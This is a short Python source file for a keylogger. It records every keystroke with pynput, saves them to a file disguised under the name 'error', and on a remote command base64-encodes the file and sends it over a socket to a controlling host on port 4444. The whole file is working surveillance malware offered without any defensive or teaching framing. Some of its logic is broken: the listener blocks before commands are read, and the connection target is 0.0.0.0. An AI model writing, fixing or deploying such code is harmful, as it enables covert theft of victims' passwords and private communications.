import socket
import pynput.keyboard as ky
import time
import base64
import simplejson

log = ""

class Keylog():
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def callback(self,key):
        global log
        try:
            log = log + str(key.char)
            print(log)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + str(key)
    
    def save_log(self,content):
        with open("error","a") as file:
            file.write(content)
    
    def log_listen(self):
        keylog = ky.Listener(on_press=self.callback)
        with keylog:
            keylog.join()

    def content_logfile(self):
        with open("error","rb") as file:
            return base64.b64encode(file.read())
    
    def json_send(self,data):
        json_data = simplejson.dumps(data).encode("utf-8")
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def Send_log(self):
        global log
        while True:
            self.save_log(log)
            command = self.json_recv()
            self.log_listen()
            if command == '1':
                output = self.content_logfile()
                self.json_send(output)
            elif command == '2':
                exit()
    
listen = Keylog("0.0.0.0",4444)
listen.log_listen()
